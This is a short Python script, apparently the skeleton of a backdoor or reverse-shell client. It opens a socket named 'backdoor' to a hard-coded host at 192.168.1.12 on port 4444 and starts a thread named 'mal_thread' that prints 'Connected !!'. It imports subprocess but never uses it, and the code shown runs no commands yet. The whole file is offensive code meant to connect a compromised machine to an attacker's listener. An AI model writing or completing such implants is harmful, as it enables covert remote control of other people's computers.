import threading
import socket
import subprocess

server_ip = '192.168.1.12'
port = 4444
    
backdoor = socket.socket()
backdoor.connect((server_ip, port))

def main():
    print("Connected !!")

mal_thread = threading.Thread(target=main)
mal_thread.start()

